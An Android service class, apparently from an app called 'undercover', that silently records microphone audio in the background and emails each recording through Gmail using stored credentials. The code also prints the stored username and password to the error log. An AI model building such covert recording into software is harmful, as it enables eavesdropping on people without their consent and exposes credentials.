package com.pranayc.undercover;

import android.app.Service;
import android.content.Intent;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;

import javax.mail.Multipart;
import javax.mail.internet.MimeMultipart;

public class RecordService extends Service
{
    private boolean recording = false;
    private MediaRecorder recorder;
    private File file = null;
    @Nullable
    @Override
    public IBinder onBind(Intent intent)
    {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        int result = super.onStartCommand(intent, flags, startId);
        if(!recording)
        {
            startRecording();
        }
        return result;
    }

    private void startRecording()
    {

        try
        {
            recorder = new MediaRecorder();
            recording = true;
            recorder.reset();
            recorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
            file = new File(Environment.getExternalStorageDirectory(),
                    "undercover"+System.currentTimeMillis()+".3gpp");
            recorder.setOutputFile(file.getAbsolutePath());
            System.out.println("File = " + file);
            recorder.setOnInfoListener(new MediaRecorder.OnInfoListener()
            {
                @Override
                public void onInfo(MediaRecorder mr, int what, int extra)
                {
                    stopRecording(false);
                }
            });
            recorder.setOnErrorListener(new MediaRecorder.OnErrorListener()
            {
                @Override
                public void onError(MediaRecorder mr, int what, int extra)
                {
                    stopRecording(false);
                }
            });
            recorder.prepare();
            for(int i =0; i <10; i++)
            {
                try
                {
                    recorder.start();
                    break;
                }
                catch (Exception e)
                {
                    System.err.println(i + " ~ " +e.getLocalizedMessage());
                    Thread.sleep(200);
                }
            }
        }
        catch (Exception e)
        {
            stopRecording(true);
            e.printStackTrace();
        }
    }

    private void stopRecording(final boolean deleteFile)
    {
        recording = false;
        if(recorder!=null)
        {
            try
            {
                recorder.stop();
                recorder.reset();
                recorder.release();
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }

            if(deleteFile)
            {
                file.delete();
            }
            else
            {
                new Thread()
                {
                    @Override
                    public void run()
                    {
                        try
                        {
                            if(file.length() > 0)
                            {
                                sendMail(file.getAbsolutePath());
                            }
                            else
                            {
                                file.delete();
                            }
                        }
                        catch (Exception ex)
                        {

                        }
                    }
                }.start();
            }
        }
    }

    private void sendMail(String absolutePath)
    {
        try
        {
            String username =  LocalStorage.get(this, "UserName");
            String password =  LocalStorage.get(this, "PassWord");
            System.err.println(username + " ~ " + password);
            GMailSender sender = new GMailSender(username, password);
            sender.addAttachment(absolutePath, "Media");
            sender.sendMail("Undercover Report", "Please find the attached media", username, username);
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy()
    {
        stopRecording(false);
        super.onDestroy();
    }
}